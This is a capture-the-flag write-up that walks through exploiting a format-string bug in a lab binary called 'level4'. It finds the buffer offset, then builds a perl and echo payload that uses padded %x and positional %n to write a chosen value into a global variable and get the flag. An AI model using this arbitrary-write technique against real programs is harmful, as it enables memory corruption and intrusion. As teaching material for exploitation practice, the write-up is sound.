This exercise is similar to the previous one, except `m` now needs to be `16_930_116` (`0x1025544`), and the `printf(3)` call is nested in another function call.

First, we need to find the offset of our buffer:

```sh
perl -e 'print "BBBB", "  %p" x 20, "\n"' | ./level4
```

It prints:

```
BBBB  0xb7ff26b0  0xbffff794  0xb7fd0ff4  (nil)  (nil)  0xbffff758  0x804848d  0xbffff550  0x200  0xb7fd1ac0  0xb7ff37d0  0x42424242  0x70252020  0x70252020  0x70252020  0x70252020  0x70252020  0x70252020  0x70252020  0x70252020
```

`0x42424242` is the 12th element.  Let's confirm that this is what we actually want:

```sh
echo '**** %12$p' | ./level4
```

Output:

```
**** 0x2a2a2a2a
```

Perfect.  The address of `m` is `0x08049810` so we can add to the payload:

```
perl -e 'print pack("L<", 0x08049810), "%4\$u%12\$p\n"' | ./level4
```

Then we need to use the `%n` conversion to somehow write `16930116` bytes to `m`.  We can't simply put that many bytes into the payload because the read limit is 512.  Instead, we can leverage the `printf(3)` flags.  Using the `0` flag is easiest because it pads any number with as many zeroes as we want.  For example:

```c
printf("%05d\n", 42);
```

Will print `00042`.  It does not work with the `%p` conversion though, so let's use `%x` instead.  It can be combined with positional arguments, like so: `%4$042x`.  This will print the 4th argument in hexadecimal, padded with zeroes to 42 characters.

Let's put everything together.  We have 4 bytes for the address of `m`, so we need `16930116 - 4 = 16930112` bytes before using `%n`.

```sh
{
    # address of `m`
    perl -e 'print pack("L<", 0x08049810)'

    # print enough characters
    echo -n '%12$016930112x'

    # write number of written characters so far into `m`
    echo -n '%12$n'
    
    # new line so `printf(3)` flushes automatically for a more readable output
    echo
} | ./level4
```

It works and we do get the flag, but the output is full of zeroes and it can be hard to see what's going on.  It may also saturate the terminal because about 16MB of memory were just shoved into stdout.  There are two things we can do: change the padding from zeroes to spaces, and pipe the output into a program to remove what we don't want.  Using spaces for padding is simply a matter of changing the `0` flag by the ` ` (space) flag.  `echo -n '%12$016930112x'` becomes `echo -n '%12$ 16930112x'`.  Now for the program.  The options are basically endless, but `tr` (text replace) is a good choice.  We can use `tr -d ' '` to delete every single space from the output.  The final command is:

```
{
    # address of `m`
    perl -e 'print pack("L<", 0x08049810)'

    # print enough characters
    echo -n '%12$ 16930112x'

    # write number of written characters so far into `m`
    echo -n '%12$n'
    
    # new line so `printf(3)` flushes automatically for a more readable output
    echo
} | ./level4 | tr -d ' '
```

We get a bit of garbage before and after the flag, but it is way more readable.
